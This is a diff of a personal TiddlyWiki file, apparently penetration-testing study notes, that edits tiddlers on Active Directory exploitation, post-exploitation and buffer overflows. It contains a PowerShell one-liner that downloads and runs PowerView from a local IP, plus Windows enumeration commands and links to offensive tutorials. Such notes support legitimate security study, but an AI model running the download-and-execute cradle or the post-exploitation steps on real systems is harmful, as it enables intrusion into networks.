@@ -10112,7 +10112,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20211208151819087" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211214123639401" list="CrappyMakerProgrammer Tech [[Cyber Security]] [[Penetration Testing]] [[OSCP Style Windows Buffer Overflow]]" modified="20211214133006010" title="$:/StoryList">
+<div created="20211215081058649" list="CrappyMakerProgrammer Tech [[Cyber Security]] [[Penetration Testing]] [[Post Exploitation]] [[Active Directory Exploitation]]" modified="20211215084251328" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -11103,7 +11103,7 @@ http://marlinfw.org/docs/gcode/M302.html
 # [[Project Work]]
 # [[Economics|https://drive.google.com/open?id=1TPLzZ9AZ3WjlCvFcmPdK7OZKEtZ4KUGT]]</pre>
 </div>
-<div created="20211209113521474" modified="20211209141412776" title="Active Directory Exploitation" type="text/x-markdown">
+<div created="20211209113521474" modified="20211215084351107" title="Active Directory Exploitation" type="text/x-markdown">
 <pre>https://attack.stealthbits.com/how-golden-ticket-attack-works
 
 
@@ -11124,6 +11124,14 @@ Basic
 PowerView
 
 Loading: `IEX(New-Object Net.WebClient).downloadString('http://192.168.119.172:8000/PowerView.ps1')`
+
+Bloodhound
+
+https://www.aldeid.com/wiki/TryHackMe-Post-Exploitation-Basics#[Task_3]_Enumeration_w/_Bloodhound
+
+https://tryhackme.com/room/postexploit
+
+https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux
 
 # Authentication
 
@@ -12840,10 +12848,8 @@ Providers
  
 </pre>
 </div>
-<div created="20210911161500439" modified="20211214143250414" title="OSCP Style Windows Buffer Overflow">
-<pre>https://github.com/hax3xploit/BufferOverFlow
-
-Tools
+<div created="20210911161500439" modified="20211114090445424" title="OSCP Style Windows Buffer Overflow">
+<pre>Tools
 
 # Immunity Debugger
 # Mona
@@ -13130,19 +13136,9 @@ Referenced from [[here|https://infinitelogins.com/2021/02/20/using-metasploit-ro
 ### Change (not add, It will pick the first proxy server) the last line to `socks4 127.0.0.1 1080`
 ## `proxychains4 &lt;command&gt;`</pre>
 </div>
-<div created="20211205085540773" modified="20211214123805605" title="Post Exploitation">
+<div created="20211205085540773" modified="20211209134127266" title="Post Exploitation">
 <pre>
 https://sushant747.gitbooks.io/total-oscp-guide/content/loot_windows_-_for_credentials_and_other_stuff.html
-
-Windows
-https://forums.offensive-security.com/showthread.php?43343-Can-i-get-a-nudge-where-the-exe-stored-in-chris
-
-```
-cmd.exe /c dir /a C:/ ------------------------------------#Any strange or hidden directories/files in C drive?
-gci -Recurse C:\users | Select FullName ----------#Shows all files in C:\users and sub-directories.
-ls &quot;C:\Program Files&quot; ---------------------------------- # What non-default software is installed?
-ls &quot;C:\Program Files (x86)&quot; ----------------------------# What non-default software is installed?
-```
 
 [[Active Directory]]
 
